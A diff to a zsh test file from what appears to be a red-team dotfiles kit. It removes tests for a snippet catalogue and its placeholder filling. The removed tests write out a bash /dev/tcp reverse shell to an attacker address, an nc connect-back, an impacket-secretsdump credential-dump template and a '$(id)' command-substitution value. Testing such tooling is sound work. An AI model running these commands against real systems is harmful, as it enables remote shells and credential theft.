@@ -210,46 +210,9 @@ ok  "$(grep -c . $RT_HOSTS_INDEX)" "7" "re-harvesting is idempotent"
 ok  "$(grep -c '^[0-9.]*	[0-9.]*$' $RT_HOSTS_INDEX)" "0" "addresses are never stored as names"
 
 # ==============================================================================
-# snippets
-# ==============================================================================
-typeset -g LHOST="" RHOST="" DOMAIN="" DC="" U="" P="" HASH="" FILE="" SUBNET="" PORT=""
-source $RT_DOTFILES/shell/zsh/snippets.zsh
-
-t "snippets: catalogue"
-ok "$(rt-snippet-list | awk -F'\t' 'NF!=3' | wc -l)" "0" "every row is category/label/command"
-ok "$(rt-snippet-list | awk -F'\t' '$3 ~ /^#/' | wc -l)" "0" "no comment leaked into a command"
-ok "$(rt-snippet-list | awk -F'\t' '{print $1}' | sort -u | wc -l)" "6" "six categories"
-for c in revshell ad tunnel transfer tty crack; do
-    (( _t_run++ ))
-    if rt-snippet-list | cut -f1 | grep -q "^$c"; then print -r -- "  ok    category present: $c"
-    else print -r -- "  FAIL  category missing: $c"; _t_fail=1; fi
-done
-
-t "snippets: filling"
-LHOST=10.10.14.7 RHOST=10.10.11.42 DOMAIN=corp.local U=svc_sql
-ok "$(_rt_snippet_fill 'bash -i >& /dev/tcp/{{LHOST}}/{{PORT}} 0>&1')" \
-   'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1' "port defaults to 4444"
-PORT=9001
-ok "$(_rt_snippet_fill 'nc {{LHOST}} {{PORT}}')" 'nc 10.10.14.7 9001' "explicit port wins"
-ok "$(_rt_snippet_fill 'nxc smb {{RHOST}} -u {{U}} -d {{DOMAIN}}')" \
-   'nxc smb 10.10.11.42 -u svc_sql -d corp.local' "several placeholders at once"
-has "$(_rt_snippet_fill 'impacket-secretsdump {{DOMAIN}}/{{U}}:{{P}}@{{RHOST}}')" \
-   '{{P}}' "unset variables keep a visible placeholder"
-
-t "snippets: a password is data, never syntax"
-# The reason filling happens in zsh and not sed: these are all legal passwords.
-P='p&w|d\1'
-ok "$(_rt_snippet_fill "connect {{U}}:{{P}}@{{RHOST}}")" \
-   'connect svc_sql:p&w|d\1@10.10.11.42' "ampersand, pipe and backslash survive"
-P='a/b/c'
-ok "$(_rt_snippet_fill '{{P}}')" 'a/b/c' "slashes survive"
-P='$(id)'
-ok "$(_rt_snippet_fill '{{P}}')" '$(id)' "command substitution is not evaluated"
-P=""
-
-# ==============================================================================
 # redaction
 # ==============================================================================
+typeset -g LHOST="" RHOST="" DOMAIN="" DC="" U="" P="" HASH="" FILE="" SUBNET="" PORT=""
 source $RT_DOTFILES/shell/zsh/redact.zsh
 
 t "redaction: what must survive"
